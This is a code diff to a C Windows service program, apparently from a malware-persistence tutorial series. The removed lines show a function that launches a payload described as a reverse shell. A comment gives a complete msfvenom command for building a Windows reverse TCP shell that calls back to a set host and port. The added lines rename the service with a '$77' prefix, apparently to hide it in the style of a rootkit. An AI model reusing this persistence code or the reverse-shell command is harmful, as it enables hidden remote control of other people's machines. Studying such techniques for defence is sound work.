@@ -29,28 +29,9 @@ SERVICE_STATUS_HANDLE hStatus;
 void ServiceMain(int argc, char** argv);
 void ControlHandler(DWORD request);
 
-// run process meow.exe - reverse shell
-int RunMeow() {
-    void* lb;
-    BOOL rv;
-    HANDLE th;
-
-    // for example: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe
-    LPWSTR cmd = (LPWSTR)"Z:\\2022-05-09-malware-pers-4\\meow.exe";
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
-    CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    CloseHandle(pi.hProcess);
-    return 0;
-}
-
 int main() {
     SERVICE_TABLE_ENTRY ServiceTable[] = {
-      {(LPWSTR)"MeowService", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
+      {(LPWSTR)"$77service", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
       {NULL, NULL}
     };
 
@@ -67,8 +48,7 @@ void ServiceMain(int argc, char** argv) {
     serviceStatus.dwCheckPoint = 0;
     serviceStatus.dwWaitHint = 0;
 
-    hStatus = RegisterServiceCtrlHandler((LPCWSTR)"MeowService", (LPHANDLER_FUNCTION)ControlHandler);
-    //RunMeow();
+    hStatus = RegisterServiceCtrlHandler((LPCWSTR)"$77service", (LPHANDLER_FUNCTION)ControlHandler);
 
     serviceStatus.dwCurrentState = SERVICE_RUNNING;
     SetServiceStatus(hStatus, &serviceStatus);
